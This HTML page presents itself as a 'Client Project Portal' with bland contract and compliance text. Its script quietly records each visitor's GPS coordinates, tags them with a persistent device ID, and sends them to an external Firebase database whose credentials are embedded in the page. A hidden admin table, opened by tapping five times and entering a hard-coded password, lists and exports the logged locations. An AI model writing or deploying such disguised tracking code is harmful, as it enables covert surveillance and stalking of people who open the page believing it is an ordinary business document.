<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Client Project Portal</title>
  <style>
    :root {
      --main-bg: #f4f6f9;
      --primary: #3a3f51;
      --accent: #e74c3c;
      --shadow: rgba(0, 0, 0, 0.1);
    }* {
  box-sizing: border-box;
  font-family: 'Segoe UI', sans-serif;
}

body {
  margin: 0;
  background: var(--main-bg);
}

.container {
  padding: 2rem;
  max-width: 1000px;
  margin: auto;
}

.card {
  background: white;
  padding: 1.5rem;
  border-radius: 10px;
  box-shadow: 0 2px 10px var(--shadow);
  margin-bottom: 2rem;
  transition: all 0.3s ease-in-out;
}

.card:hover {
  transform: scale(1.01);
}

.hidden {
  display: none;
}

h1, h2 {
  color: var(--primary);
}

table {
  width: 100%;
  border-collapse: collapse;
  margin-top: 1rem;
}

table th, table td {
  padding: 0.8rem;
  text-align: left;
  border-bottom: 1px solid #ddd;
}

input[type="text"] {
  padding: 0.6rem;
  width: 100%;
  margin: 0.5rem 0 1rem;
  border: 1px solid #ccc;
  border-radius: 5px;
}

.export-btn {
  background: var(--accent);
  color: white;
  padding: 0.6rem 1.2rem;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  margin-bottom: 1rem;
}

.export-btn:hover {
  background: #c0392b;
}

.note {
  font-size: 0.9rem;
  color: gray;
}

.fade-in {
  animation: fadein 1s ease-in-out;
}

@keyframes fadein {
  from { opacity: 0; transform: translateY(10px); }
  to { opacity: 1; transform: translateY(0); }
}

  </style>
</head>
<body>
  <div class="container">
    <div id="contract" class="card fade-in">
      <h1>Client Project Portal</h1>
      <p><strong>Client Requirements</strong></p>
      <p>All specifications must be approved and timestamped.</p><p><strong>Terms and Review</strong></p>
  <p>Final review will be automatically saved and verified upon access.</p>

  <p><strong>Legal & Compliance</strong></p>
  <p>Ensure full adherence to documentation agreements.</p>

  <p class="note">Tap 5 times anywhere below and scroll to the bottom to access internal review...</p>
</div>

<div id="admin" class="card hidden fade-in">
  <h2>Admin Dashboard</h2>
  <input id="search" type="text" placeholder="Search by device or location..." />
  <button class="export-btn" onclick="exportCSV()">Export as CSV</button>
  <p><strong>Daily logs:</strong> <span id="dailyCount">0</span></p>
  <table>
    <thead>
      <tr>
        <th>Device</th>
        <th>Latitude</th>
        <th>Longitude</th>
        <th>Timestamp</th>
      </tr>
    </thead>
    <tbody id="logTable"></tbody>
  </table>
  <p class="note">This page is protected by a secure contract interface.</p>
</div>

  </div>  <script type="module">
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js';
    import { getDatabase, ref, push, onValue } from 'https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js';

    const firebaseConfig = {
      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
      authDomain: "gps-d0bab.firebaseapp.com",
      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
      projectId: "gps-d0bab",
      storageBucket: "gps-d0bab.appspot.com",
      messagingSenderId: "810816177909",
      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const logsRef = ref(db, 'logs');

    function logLocation() {
      if (!navigator.geolocation) return;
      navigator.geolocation.getCurrentPosition(pos => {
        push(logsRef, {
          device: deviceID(),
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          timestamp: new Date().toISOString()
        });
      });
    }

    function deviceID() {
      let id = localStorage.getItem("device_id");
      if (!id) {
        id = Math.random().toString(36).slice(2);
        localStorage.setItem("device_id", id);
      }
      return id;
    }

    function updateTable(data) {
      const tbody = document.getElementById('logTable');
      const search = document.getElementById('search').value.toLowerCase();
      tbody.innerHTML = '';
      let dailyCount = 0;

      for (const key in data) {
        const entry = data[key];
        const date = new Date(entry.timestamp);
        const today = new Date();
        const isToday = date.toDateString() === today.toDateString();

        if (isToday) dailyCount++;

        const rowText = `${entry.device} ${entry.lat} ${entry.lng} ${entry.timestamp}`.toLowerCase();
        if (!rowText.includes(search)) continue;

        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td>${entry.device}</td>
          <td>${entry.lat}</td>
          <td>${entry.lng}</td>
          <td>${new Date(entry.timestamp).toLocaleString()}</td>
        `;
        tbody.appendChild(tr);
      }

      document.getElementById('dailyCount').innerText = dailyCount;
    }

    onValue(logsRef, snap => {
      const data = snap.val() || {};
      updateTable(data);
    });

    document.getElementById('search').addEventListener('input', () => {
      onValue(logsRef, snap => {
        const data = snap.val() || {};
        updateTable(data);
      });
    });

    function exportCSV() {
      let csv = 'Device,Latitude,Longitude,Timestamp\n';
      document.querySelectorAll('#logTable tr').forEach(row => {
        const cols = row.querySelectorAll('td');
        const rowText = Array.from(cols).map(td => td.innerText).join(',');
        csv += rowText + '\n';
      });
      const blob = new Blob([csv], { type: 'text/csv' });
      const a = document.createElement('a');
      a.href = URL.createObjectURL(blob);
      a.download = 'location_logs.csv';
      a.click();
    }

    // Tap + scroll unlock for admin panel
    let tapCount = 0;
    document.getElementById('contract').addEventListener('click', () => {
      tapCount++;
      if (tapCount >= 5) {
        setTimeout(() => {
          if (window.scrollY + window.innerHeight >= document.body.scrollHeight) {
            const pass = prompt('Enter access password');
            if (pass === 'ASCII') {
              document.getElementById('admin').classList.remove('hidden');
              window.scrollTo(0, 0);
            }
          }
        }, 500);
      }
    });

    logLocation();
  </script></body>
  </html>
